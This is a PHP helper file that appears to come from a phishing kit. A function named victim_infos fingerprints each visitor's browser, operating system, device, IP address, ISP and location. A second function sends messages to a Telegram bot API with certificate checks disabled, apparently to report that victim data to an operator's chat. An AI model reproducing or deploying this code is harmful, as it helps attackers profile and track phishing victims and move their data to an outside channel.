<?php
require_once(b . "/src/lib/BrowserDetection.php");
function victim_infos($ip, $check)
{


    $detect = new foroco\BrowserDetection();
    $result = json_decode($detect->getAll($_SERVER['HTTP_USER_AGENT'], 'JSON'), true);
    $f = country2flag($check['countryCode']);
    return "
    
🔌 Browser: <code>" . $result['browser_name'] . "</code>
🔌 Os: <code>" .  $result['os_name'] . " " . $result['os_version'] . "</code> <u>(" . $result['device_type'] . ")</u>
🌐 IP: <code>$ip</code>
🌐 IP API: <a href='https://ip-api.com/#$ip'>geoiptool</a>
🌐 Isp: <code>" . $check['isp'] . "</code>
$f Country: <code>" . $check['country'] . "</code>
$f City: <code>" . $check['city'] . " " . $check['zip'] . "</code>";
}

function country2flag($countryCode)
{
    return mb_convert_encoding('&#' .
        implode(
            ';&#',
            array_map(function ($char) {
                return 127397 + ord($char);
            }, str_split(strtoupper($countryCode)))
        ) . ';', 'UTF-8', 'HTML-ENTITIES');
}

function createId($oct = 16)
{
    return bin2hex(random_bytes($oct));
}


function telegram_api($token, $method, $params = [], $post = false)
{
    $url = ('https://api.telegram.org/bot' . $token . '/') . $method;
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    // if ($sendFile && isset($params['file'])) {
    //     $postFields = [];
    //     foreach ($params as $key => $value) {
    //         if ($key === 'file') {
    //             $postFields[$key] = new CURLFile($value);
    //         } else {
    //             $postFields[$key] = $value;
    //         }
    //     }
    //     curl_setopt($ch, CURLOPT_POST, true);
    //     curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    // } else {
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, true);
    }

    if (!empty($params)) {
        if ($post) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
        } else {
            $url .= '?' . http_build_query($params);
            curl_setopt($ch, CURLOPT_URL, $url);
        }
    }

    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        throw new Exception('cURL Error: ' . $error);
    }

    return json_decode($response, true)['result'] ?? json_decode($response, true);
}
